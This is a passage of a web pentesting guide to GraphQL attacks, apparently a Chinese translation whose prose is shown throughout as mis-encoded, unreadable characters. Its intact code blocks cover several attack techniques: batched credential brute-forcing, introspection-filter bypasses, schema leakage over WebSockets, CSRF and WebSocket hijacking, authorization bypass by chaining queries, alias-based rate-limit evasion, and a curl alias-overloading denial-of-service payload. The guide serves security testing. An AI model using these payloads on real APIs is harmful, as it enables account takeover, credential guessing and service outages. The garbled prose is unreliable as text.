<p>æˆ–è€…ç”šè‡³<strong>ä½¿ç”¨åˆ«åçš„å¤šä¸ªä¸åŒå¯¹è±¡çš„å…³ç³»</strong>ï¼š</p>
<pre><code class="language-javascript">{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
</code></pre>
<h3 id="mutations"><a class="header" href="#mutations">Mutations</a></h3>
<p><strong>å˜æ›´ç”¨äºåœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œæ›´æ”¹ã€‚</strong></p>
<p>åœ¨<strong>è‡ªçœ</strong>ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°<strong>å£°æ˜çš„</strong> <strong>å˜æ›´</strong>ã€‚åœ¨ä¸‹å›¾ä¸­ï¼Œ"<em>MutationType</em>" è¢«ç§°ä¸º "<em>Mutation</em>"ï¼Œè€Œ "<em>Mutation</em>" å¯¹è±¡åŒ…å«å˜æ›´çš„åç§°ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º "<em>addPerson</em>"ï¼‰ï¼š</p>
<p><img src="../../.gitbook/assets/Screenshot%20from%202021-03-13%2018-26-27%20(1).png" alt="" /></p>
<p>åœ¨æ­¤è®¾ç½®ä¸­ï¼Œ<strong>æ•°æ®åº“</strong>åŒ…å«<strong>äººå‘˜</strong>å’Œ<strong>ç”µå½±</strong>ã€‚<strong>äººå‘˜</strong>é€šè¿‡ä»–ä»¬çš„<strong>ç”µå­é‚®ä»¶</strong>å’Œ<strong>å§“å</strong>è¿›è¡Œè¯†åˆ«ï¼›<strong>ç”µå½±</strong>é€šè¿‡å®ƒä»¬çš„<strong>åç§°</strong>å’Œ<strong>è¯„åˆ†</strong>è¿›è¡Œè¯†åˆ«ã€‚<strong>äººå‘˜</strong>å¯ä»¥å½¼æ­¤æˆä¸ºæœ‹å‹ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥æ‹¥æœ‰ç”µå½±ï¼Œè¡¨ç¤ºæ•°æ®åº“ä¸­çš„å…³ç³»ã€‚</p>
<p>ä¸€ä¸ª<strong>åœ¨æ•°æ®åº“ä¸­åˆ›å»ºæ–°</strong>ç”µå½±çš„å˜æ›´å¯ä»¥åƒä»¥ä¸‹ç¤ºä¾‹ï¼ˆåœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå˜æ›´è¢«ç§°ä¸º <code>addMovie</code>ï¼‰ï¼š</p>
<pre><code class="language-javascript">mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
</code></pre>
<p><strong>æ³¨æ„æŸ¥è¯¢ä¸­å¦‚ä½•æŒ‡ç¤ºå€¼å’Œæ•°æ®ç±»å‹ã€‚</strong></p>
<p>æ­¤å¤–ï¼Œæ•°æ®åº“æ”¯æŒä¸€ä¸ª<strong>mutation</strong>æ“ä½œï¼Œåä¸º<code>addPerson</code>ï¼Œå…è®¸åˆ›å»º<strong>persons</strong>åŠå…¶ä¸ç°æœ‰<strong>friends</strong>å’Œ<strong>movies</strong>çš„å…³è”ã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œæœ‹å‹å’Œç”µå½±å¿…é¡»åœ¨æ•°æ®åº“ä¸­é¢„å…ˆå­˜åœ¨ï¼Œæ‰èƒ½å°†å®ƒä»¬é“¾æ¥åˆ°æ–°åˆ›å»ºçš„äººã€‚</p>
<pre><code class="language-javascript">mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
</code></pre>
<h3 id="æŒ‡ä»¤é‡è½½"><a class="header" href="#æŒ‡ä»¤é‡è½½">æŒ‡ä»¤é‡è½½</a></h3>
<p>å¦‚<a href="https://www.landh.tech/blog/20240304-google-hack-50000/"><strong>æœ¬æŠ¥å‘Šä¸­æè¿°çš„æ¼æ´ä¹‹ä¸€</strong></a>æ‰€è¿°ï¼ŒæŒ‡ä»¤é‡è½½æ„å‘³ç€è°ƒç”¨æŒ‡ä»¤ç”šè‡³æ•°ç™¾ä¸‡æ¬¡ï¼Œä»¥ä½¿æœåŠ¡å™¨æµªè´¹æ“ä½œï¼Œç›´åˆ°å¯èƒ½å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚</p>
<h3 id="åœ¨1ä¸ªapiè¯·æ±‚ä¸­æ‰¹é‡æš´åŠ›ç ´è§£"><a class="header" href="#åœ¨1ä¸ªapiè¯·æ±‚ä¸­æ‰¹é‡æš´åŠ›ç ´è§£">åœ¨1ä¸ªAPIè¯·æ±‚ä¸­æ‰¹é‡æš´åŠ›ç ´è§£</a></h3>
<p>æ­¤ä¿¡æ¯æ¥è‡ª<a href="https://lab.wallarm.com/graphql-batching-attack/">https://lab.wallarm.com/graphql-batching-attack/</a>ã€‚<br />
é€šè¿‡GraphQL APIè¿›è¡Œèº«ä»½éªŒè¯ï¼Œ<strong>åŒæ—¶å‘é€å¤šä¸ªä¸åŒå‡­æ®çš„æŸ¥è¯¢</strong>è¿›è¡Œæ£€æŸ¥ã€‚è¿™æ˜¯ä¸€ç§ç»å…¸çš„æš´åŠ›ç ´è§£æ”»å‡»ï¼Œä½†ç°åœ¨ç”±äºGraphQLæ‰¹é‡å¤„ç†åŠŸèƒ½ï¼Œå¯ä»¥åœ¨æ¯ä¸ªHTTPè¯·æ±‚ä¸­å‘é€å¤šä¸ªç™»å½•/å¯†ç å¯¹ã€‚è¿™ç§æ–¹æ³•ä¼šæ¬ºéª—å¤–éƒ¨é€Ÿç‡ç›‘æ§åº”ç”¨ç¨‹åºï¼Œä½¿å…¶è®¤ä¸ºä¸€åˆ‡æ­£å¸¸ï¼Œæ²¡æœ‰æš´åŠ›ç ´è§£æœºå™¨äººè¯•å›¾çŒœæµ‹å¯†ç ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºèº«ä»½éªŒè¯è¯·æ±‚çš„æœ€ç®€å•æ¼”ç¤ºï¼Œ<strong>ä¸€æ¬¡æœ‰3ä¸ªä¸åŒçš„ç”µå­é‚®ä»¶/å¯†ç å¯¹</strong>ã€‚æ˜¾ç„¶ï¼Œå¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼åœ¨å•ä¸ªè¯·æ±‚ä¸­å‘é€æ•°åƒä¸ªï¼š</p>
<p><img src="../../.gitbook/assets/image%20(1081).png" alt="" /></p>
<p>ä»å“åº”æˆªå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªè¯·æ±‚è¿”å›äº†_null_ï¼Œå¹¶åœ¨_error_éƒ¨åˆ†åæ˜ äº†ç›¸åº”çš„ä¿¡æ¯ã€‚<strong>ç¬¬äºŒä¸ªå˜æ›´å…·æœ‰æ­£ç¡®çš„èº«ä»½éªŒè¯</strong>æ•°æ®ï¼Œå“åº”ä¸­åŒ…å«æ­£ç¡®çš„èº«ä»½éªŒè¯ä¼šè¯ä»¤ç‰Œã€‚</p>
<p><img src="../../.gitbook/assets/image%20(119)%20(1).png" alt="" /></p>
<h2 id="æ— éœ€è‡ªçœçš„graphql"><a class="header" href="#æ— éœ€è‡ªçœçš„graphql">æ— éœ€è‡ªçœçš„GraphQL</a></h2>
<p>è¶Šæ¥è¶Šå¤šçš„<strong>graphqlç«¯ç‚¹æ­£åœ¨ç¦ç”¨è‡ªçœ</strong>ã€‚ç„¶è€Œï¼Œå½“æ”¶åˆ°æ„å¤–è¯·æ±‚æ—¶ï¼ŒgraphqlæŠ›å‡ºçš„é”™è¯¯è¶³ä»¥è®©åƒ<a href="https://github.com/nikitastupin/clairvoyance"><strong>clairvoyance</strong></a>è¿™æ ·çš„å·¥å…·é‡å»ºå¤§éƒ¨åˆ†æ¶æ„ã€‚</p>
<p>æ­¤å¤–ï¼ŒBurp Suiteæ‰©å±•<a href="https://github.com/forcesunseen/graphquail"><strong>GraphQuail</strong></a> <strong>è§‚å¯Ÿé€šè¿‡Burpçš„GraphQL APIè¯·æ±‚</strong>å¹¶<strong>æ„å»º</strong>ä¸€ä¸ªå†…éƒ¨GraphQL <strong>æ¶æ„</strong>ï¼Œæ¯å½“å®ƒçœ‹åˆ°æ–°çš„æŸ¥è¯¢æ—¶ã€‚å®ƒè¿˜å¯ä»¥ä¸ºGraphiQLå’ŒVoyagerå…¬å¼€æ¶æ„ã€‚å½“æ”¶åˆ°è‡ªçœæŸ¥è¯¢æ—¶ï¼Œè¯¥æ‰©å±•è¿”å›ä¸€ä¸ªå‡å“åº”ã€‚å› æ­¤ï¼ŒGraphQuailæ˜¾ç¤ºäº†APIä¸­å¯ç”¨çš„æ‰€æœ‰æŸ¥è¯¢ã€å‚æ•°å’Œå­—æ®µã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·<a href="https://blog.forcesunseen.com/graphql-security-testing-without-a-schema"><strong>æŸ¥çœ‹æ­¤å¤„</strong></a>ã€‚</p>
<p>ä¸€ä¸ªå¾ˆå¥½çš„<strong>è¯è¡¨</strong>å¯ä»¥åœ¨è¿™é‡Œå‘ç°<a href="https://github.com/Escape-Technologies/graphql-wordlist?"><strong>GraphQLå®ä½“</strong></a>ã€‚</p>
<h3 id="ç»•è¿‡graphqlè‡ªçœé˜²å¾¡"><a class="header" href="#ç»•è¿‡graphqlè‡ªçœé˜²å¾¡">ç»•è¿‡GraphQLè‡ªçœé˜²å¾¡ <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a></a></h3>
<p>ä¸ºäº†ç»•è¿‡APIä¸­å¯¹è‡ªçœæŸ¥è¯¢çš„é™åˆ¶ï¼Œåœ¨<code>__schema</code>å…³é”®å­—åæ’å…¥<strong>ç‰¹æ®Šå­—ç¬¦</strong>è¢«è¯æ˜æ˜¯æœ‰æ•ˆçš„ã€‚è¿™ç§æ–¹æ³•åˆ©ç”¨äº†å¼€å‘äººå‘˜åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­çš„å¸¸è§ç–å¿½ï¼Œè¿™äº›æ¨¡å¼æ—¨åœ¨é€šè¿‡å…³æ³¨<code>__schema</code>å…³é”®å­—æ¥é˜»æ­¢è‡ªçœã€‚é€šè¿‡æ·»åŠ åƒ<strong>ç©ºæ ¼ã€æ¢è¡Œç¬¦å’Œé€—å·</strong>è¿™æ ·çš„å­—ç¬¦ï¼ŒGraphQLä¼šå¿½ç•¥è¿™äº›å­—ç¬¦ï¼Œä½†æ­£åˆ™è¡¨è¾¾å¼å¯èƒ½æ²¡æœ‰è€ƒè™‘åˆ°ï¼Œä»è€Œå¯ä»¥ç»•è¿‡é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œåœ¨<code>__schema</code>åé¢å¸¦æœ‰æ¢è¡Œç¬¦çš„è‡ªçœæŸ¥è¯¢å¯èƒ½ä¼šç»•è¿‡è¿™æ ·çš„é˜²å¾¡ï¼š</p>
<pre><code class="language-bash"># Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
</code></pre>
<p>å¦‚æœä¸æˆåŠŸï¼Œè¯·è€ƒè™‘å…¶ä»–è¯·æ±‚æ–¹æ³•ï¼Œä¾‹å¦‚ <strong>GET è¯·æ±‚</strong> æˆ– <strong>ä½¿ç”¨ <code>x-www-form-urlencoded</code> çš„ POST è¯·æ±‚</strong>ï¼Œå› ä¸ºé™åˆ¶å¯èƒ½ä»…é€‚ç”¨äº POST è¯·æ±‚ã€‚</p>
<h3 id="å°è¯•-websockets"><a class="header" href="#å°è¯•-websockets">å°è¯• WebSockets</a></h3>
<p>æ­£å¦‚åœ¨ <a href="https://www.youtube.com/watch?v=tIo_t5uUK50"><strong>è¿™ä¸ªæ¼”è®²</strong></a> ä¸­æåˆ°çš„ï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥é€šè¿‡ WebSockets è¿æ¥åˆ° graphQLï¼Œå› ä¸ºè¿™å¯èƒ½å…è®¸æ‚¨ç»•è¿‡æ½œåœ¨çš„ WAFï¼Œå¹¶ä½¿ websocket é€šä¿¡æ³„éœ² graphQL çš„æ¶æ„ï¼š</p>
<pre><code class="language-javascript">ws = new WebSocket('wss://target/graphql', 'graphql-ws');
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`
}

var graphqlMsg = {
type: 'GQL.START',
id: '1',
payload: GQL_CALL,
};
ws.send(JSON.stringify(graphqlMsg));
}
</code></pre>
<h3 id="å‘ç°æš´éœ²çš„-graphql-ç»“æ„"><a class="header" href="#å‘ç°æš´éœ²çš„-graphql-ç»“æ„"><strong>å‘ç°æš´éœ²çš„ GraphQL ç»“æ„</strong></a></h3>
<p>å½“ introspection è¢«ç¦ç”¨æ—¶ï¼Œæ£€æŸ¥ç½‘ç«™æºä»£ç ä¸­ JavaScript åº“ä¸­é¢„åŠ è½½çš„æŸ¥è¯¢æ˜¯ä¸€ç§æœ‰æ•ˆçš„ç­–ç•¥ã€‚è¿™äº›æŸ¥è¯¢å¯ä»¥é€šè¿‡å¼€å‘è€…å·¥å…·ä¸­çš„ <code>Sources</code> é€‰é¡¹å¡æ‰¾åˆ°ï¼Œæä¾›æœ‰å…³ API æ¶æ„çš„è§è§£ï¼Œå¹¶æ­ç¤ºæ½œåœ¨çš„ <strong>æš´éœ²æ•æ„ŸæŸ¥è¯¢</strong>ã€‚åœ¨å¼€å‘è€…å·¥å…·ä¸­æœç´¢çš„å‘½ä»¤æ˜¯ï¼š</p>
<pre><code class="language-javascript">Inspect/Sources/"Search all files"
file:* mutation
file:* query
</code></pre>
<h2 id="csrf-in-graphql"><a class="header" href="#csrf-in-graphql">CSRF in GraphQL</a></h2>
<p>å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ CSRFï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š</p>
<p>{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
<a href="../../pentesting-web/csrf-cross-site-request-forgery.html">csrf-cross-site-request-forgery.md</a>
{% endcontent-ref %}</p>
<p>åœ¨å¤–é¢ï¼Œä½ å°†èƒ½å¤Ÿæ‰¾åˆ°å‡ ä¸ª <strong>æœªé…ç½® CSRF ä»¤ç‰Œçš„</strong> GraphQL ç«¯ç‚¹ã€‚</p>
<p>è¯·æ³¨æ„ï¼ŒGraphQL è¯·æ±‚é€šå¸¸é€šè¿‡ä½¿ç”¨ Content-Type <strong><code>application/json</code></strong> çš„ POST è¯·æ±‚å‘é€ã€‚</p>
<pre><code class="language-javascript">{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
</code></pre>
<p>ç„¶è€Œï¼Œå¤§å¤šæ•° GraphQL ç«¯ç‚¹ä¹Ÿæ”¯æŒ <strong><code>form-urlencoded</code> POST è¯·æ±‚ï¼š</strong></p>
<pre><code class="language-javascript">query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
</code></pre>
<p>å› æ­¤ï¼Œåƒä¹‹å‰é‚£æ ·çš„ CSRF è¯·æ±‚æ˜¯ <strong>åœ¨æ²¡æœ‰é¢„æ£€è¯·æ±‚çš„æƒ…å†µä¸‹</strong> å‘é€çš„ï¼Œå› æ­¤å¯ä»¥ <strong>åˆ©ç”¨</strong> <strong>CSRF</strong> åœ¨ GraphQL ä¸­ <strong>è¿›è¡Œ</strong> <strong>æ›´æ”¹</strong>ã€‚</p>
<p>ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼ŒChrome çš„ <code>samesite</code> æ ‡å¿—çš„æ–°é»˜è®¤ cookie å€¼ä¸º <code>Lax</code>ã€‚è¿™æ„å‘³ç€ cookie ä»…ä¼šåœ¨ GET è¯·æ±‚ä¸­ä»ç¬¬ä¸‰æ–¹ç½‘ç«™å‘é€ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œé€šå¸¸ä¹Ÿå¯ä»¥å°† <strong>æŸ¥è¯¢</strong> <strong>è¯·æ±‚</strong> ä½œä¸º <strong>GET</strong> <strong>è¯·æ±‚</strong> å‘é€ï¼Œå¹¶ä¸” CSRF ä»¤ç‰Œå¯èƒ½ä¸ä¼šåœ¨ GET è¯·æ±‚ä¸­è¿›è¡ŒéªŒè¯ã€‚</p>
<p>æ­¤å¤–ï¼Œåˆ©ç”¨ <a href="../../pentesting-web/xs-search/"><strong>XS-Search</strong></a> <strong>æ”»å‡»</strong> å¯èƒ½èƒ½å¤Ÿåˆ©ç”¨ç”¨æˆ·çš„å‡­æ®ä» GraphQL ç«¯ç‚¹ä¸­æå–å†…å®¹ã€‚</p>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯· <strong>æŸ¥çœ‹</strong> <a href="https://blog.doyensec.com/2021/05/20/graphql-csrf.html"><strong>åŸå§‹å¸–å­</strong></a>ã€‚</p>
<h2 id="graphql-ä¸­çš„è·¨ç«™-websocket-åŠ«æŒ"><a class="header" href="#graphql-ä¸­çš„è·¨ç«™-websocket-åŠ«æŒ">GraphQL ä¸­çš„è·¨ç«™ WebSocket åŠ«æŒ</a></h2>
<p>ç±»ä¼¼äºåˆ©ç”¨ GraphQL çš„ CRSF æ¼æ´ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œ <strong>è·¨ç«™ WebSocket åŠ«æŒï¼Œä»¥åˆ©ç”¨æœªä¿æŠ¤çš„ cookie è¿›è¡Œ GraphQL èº«ä»½éªŒè¯</strong>ï¼Œå¹¶ä½¿ç”¨æˆ·åœ¨ GraphQL ä¸­æ‰§è¡Œæ„å¤–æ“ä½œã€‚</p>
<p>æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="../../pentesting-web/websocket-attacks.md" %}
<a href="../../pentesting-web/websocket-attacks.html">websocket-attacks.md</a>
{% endcontent-ref %}</p>
<h2 id="graphql-ä¸­çš„æˆæƒ"><a class="header" href="#graphql-ä¸­çš„æˆæƒ">GraphQL ä¸­çš„æˆæƒ</a></h2>
<p>åœ¨ç«¯ç‚¹ä¸Šå®šä¹‰çš„è®¸å¤š GraphQL å‡½æ•°å¯èƒ½ä»…æ£€æŸ¥è¯·æ±‚è€…çš„èº«ä»½éªŒè¯ï¼Œè€Œä¸æ£€æŸ¥æˆæƒã€‚</p>
<p>ä¿®æ”¹æŸ¥è¯¢è¾“å…¥å˜é‡å¯èƒ½å¯¼è‡´æ•æ„Ÿè´¦æˆ·è¯¦ç»†ä¿¡æ¯ <a href="https://hackerone.com/reports/792927">æ³„éœ²</a>ã€‚</p>
<p>çªå˜ç”šè‡³å¯èƒ½å¯¼è‡´è´¦æˆ·æ¥ç®¡ï¼Œè¯•å›¾ä¿®æ”¹å…¶ä»–è´¦æˆ·æ•°æ®ã€‚</p>
<pre><code class="language-javascript">{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
</code></pre>
<h3 id="ç»•è¿‡-graphql-ä¸­çš„æˆæƒ"><a class="header" href="#ç»•è¿‡-graphql-ä¸­çš„æˆæƒ">ç»•è¿‡ GraphQL ä¸­çš„æˆæƒ</a></h3>
<p><a href="https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln">å°†æŸ¥è¯¢é“¾æ¥</a>åœ¨ä¸€èµ·å¯ä»¥ç»•è¿‡ä¸€ä¸ªå¼±è®¤è¯ç³»ç»Ÿã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æ“ä½œæ˜¯â€œforgotPasswordâ€ï¼Œå¹¶ä¸”å®ƒåº”è¯¥åªæ‰§è¡Œä¸ä¹‹ç›¸å…³çš„ forgotPassword æŸ¥è¯¢ã€‚é€šè¿‡åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªæŸ¥è¯¢å¯ä»¥ç»•è¿‡è¿™ä¸€ç‚¹ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ·»åŠ â€œregisterâ€å’Œä¸€ä¸ªç”¨æˆ·å˜é‡ï¼Œä»¥ä¾¿ç³»ç»Ÿæ³¨å†Œä¸ºæ–°ç”¨æˆ·ã€‚</p>
<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>
<h2 id="ä½¿ç”¨-graphql-ä¸­çš„åˆ«åç»•è¿‡é€Ÿç‡é™åˆ¶"><a class="header" href="#ä½¿ç”¨-graphql-ä¸­çš„åˆ«åç»•è¿‡é€Ÿç‡é™åˆ¶">ä½¿ç”¨ GraphQL ä¸­çš„åˆ«åç»•è¿‡é€Ÿç‡é™åˆ¶</a></h2>
<p>åœ¨ GraphQL ä¸­ï¼Œåˆ«åæ˜¯ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œå…è®¸åœ¨è¿›è¡Œ API è¯·æ±‚æ—¶<strong>æ˜ç¡®å‘½åå±æ€§</strong>ã€‚è¿™ä¸ªåŠŸèƒ½å¯¹äºåœ¨å•ä¸ªè¯·æ±‚ä¸­æ£€ç´¢<strong>åŒä¸€ç±»å‹çš„å¤šä¸ªå®ä¾‹</strong>ç‰¹åˆ«æœ‰ç”¨ã€‚åˆ«åå¯ä»¥ç”¨æ¥å…‹æœ GraphQL å¯¹è±¡ä¸èƒ½å…·æœ‰å¤šä¸ªåŒåå±æ€§çš„é™åˆ¶ã€‚</p>
<p>è¦è¯¦ç»†äº†è§£ GraphQL åˆ«åï¼Œæ¨èä»¥ä¸‹èµ„æºï¼š<a href="https://portswigger.net/web-security/graphql/what-is-graphql#aliases">Aliases</a>ã€‚</p>
<p>è™½ç„¶åˆ«åçš„ä¸»è¦ç›®çš„æ˜¯å‡å°‘å¤§é‡ API è°ƒç”¨çš„å¿…è¦æ€§ï¼Œä½†å·²è¯†åˆ«å‡ºä¸€ä¸ªæ„å¤–çš„ç”¨ä¾‹ï¼Œå…¶ä¸­åˆ«åå¯ä»¥è¢«åˆ©ç”¨æ¥å¯¹ GraphQL ç«¯ç‚¹æ‰§è¡Œæš´åŠ›æ”»å‡»ã€‚è¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºæŸäº›ç«¯ç‚¹å—åˆ°é€Ÿç‡é™åˆ¶å™¨çš„ä¿æŠ¤ï¼Œæ—¨åœ¨é€šè¿‡é™åˆ¶<strong>HTTP è¯·æ±‚çš„æ•°é‡</strong>æ¥é˜»æ­¢æš´åŠ›æ”»å‡»ã€‚ç„¶è€Œï¼Œè¿™äº›é€Ÿç‡é™åˆ¶å™¨å¯èƒ½æ²¡æœ‰è€ƒè™‘åˆ°æ¯ä¸ªè¯·æ±‚ä¸­çš„æ“ä½œæ•°é‡ã€‚é‰´äºåˆ«åå…è®¸åœ¨å•ä¸ª HTTP è¯·æ±‚ä¸­åŒ…å«å¤šä¸ªæŸ¥è¯¢ï¼Œå› æ­¤å¯ä»¥è§„é¿æ­¤ç±»é€Ÿç‡é™åˆ¶æªæ–½ã€‚</p>
<p>è€ƒè™‘ä¸‹é¢æä¾›çš„ç¤ºä¾‹ï¼Œå®ƒè¯´æ˜äº†å¦‚ä½•ä½¿ç”¨åˆ«åæŸ¥è¯¢æ¥éªŒè¯å•†åº—æŠ˜æ‰£ä»£ç çš„æœ‰æ•ˆæ€§ã€‚è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡é€Ÿç‡é™åˆ¶ï¼Œå› ä¸ºå®ƒå°†å¤šä¸ªæŸ¥è¯¢ç¼–è¯‘æˆä¸€ä¸ª HTTP è¯·æ±‚ï¼Œå¯èƒ½å…è®¸åŒæ—¶éªŒè¯å¤šä¸ªæŠ˜æ‰£ä»£ç ã€‚</p>
<pre><code class="language-bash"># Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
</code></pre>
<h2 id="dos-in-graphql"><a class="header" href="#dos-in-graphql">DoS in GraphQL</a></h2>
<h3 id="alias-overloading"><a class="header" href="#alias-overloading">Alias Overloading</a></h3>
<p><strong>Alias Overloading</strong> æ˜¯ä¸€ç§ GraphQL æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡ä¸ºåŒä¸€å­—æ®µè¿‡è½½æŸ¥è¯¢ï¼Œä½¿ç”¨å¤šä¸ªåˆ«åï¼Œå¯¼è‡´åç«¯è§£æå™¨é‡å¤æ‰§è¡Œè¯¥å­—æ®µã€‚è¿™å¯èƒ½ä¼šä½¿æœåŠ¡å™¨èµ„æºè¿‡è½½ï¼Œä»è€Œå¯¼è‡´ <strong>Denial of Service (DoS)</strong>ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„æŸ¥è¯¢ä¸­ï¼ŒåŒä¸€å­—æ®µï¼ˆ<code>expensiveField</code>ï¼‰ä½¿ç”¨åˆ«åè¯·æ±‚äº† 1,000 æ¬¡ï¼Œè¿«ä½¿åç«¯è®¡ç®— 1,000 æ¬¡ï¼Œå¯èƒ½è€—å°½ CPU æˆ–å†…å­˜ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-graphql"># Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
</code></pre>
<p>{% endcode %}</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå®æ–½åˆ«åè®¡æ•°é™åˆ¶ã€æŸ¥è¯¢å¤æ‚æ€§åˆ†ææˆ–é€Ÿç‡é™åˆ¶ï¼Œä»¥é˜²æ­¢èµ„æºæ»¥ç”¨ã€‚</p>
<h3 id="åŸºäºæ•°ç»„çš„æŸ¥è¯¢æ‰¹å¤„ç†"><a class="header" href="#åŸºäºæ•°ç»„çš„æŸ¥è¯¢æ‰¹å¤„ç†"><strong>åŸºäºæ•°ç»„çš„æŸ¥è¯¢æ‰¹å¤„ç†</strong></a></h3>
<p><strong>åŸºäºæ•°ç»„çš„æŸ¥è¯¢æ‰¹å¤„ç†</strong>æ˜¯ä¸€ç§æ¼æ´ï¼Œå…¶ä¸­GraphQL APIå…è®¸åœ¨å•ä¸ªè¯·æ±‚ä¸­æ‰¹å¤„ç†å¤šä¸ªæŸ¥è¯¢ï¼Œä½¿æ”»å‡»è€…èƒ½å¤ŸåŒæ—¶å‘é€å¤§é‡æŸ¥è¯¢ã€‚è¿™å¯èƒ½ä¼šé€šè¿‡å¹¶è¡Œæ‰§è¡Œæ‰€æœ‰æ‰¹å¤„ç†æŸ¥è¯¢æ¥å‹å®åç«¯ï¼Œæ¶ˆè€—è¿‡å¤šçš„èµ„æºï¼ˆCPUã€å†…å­˜ã€æ•°æ®åº“è¿æ¥ï¼‰ï¼Œå¹¶å¯èƒ½å¯¼è‡´<strong>æœåŠ¡æ‹’ç»ï¼ˆDoSï¼‰</strong>ã€‚å¦‚æœå¯¹æ‰¹å¤„ç†ä¸­çš„æŸ¥è¯¢æ•°é‡æ²¡æœ‰é™åˆ¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥é™ä½æœåŠ¡å¯ç”¨æ€§ã€‚</p>
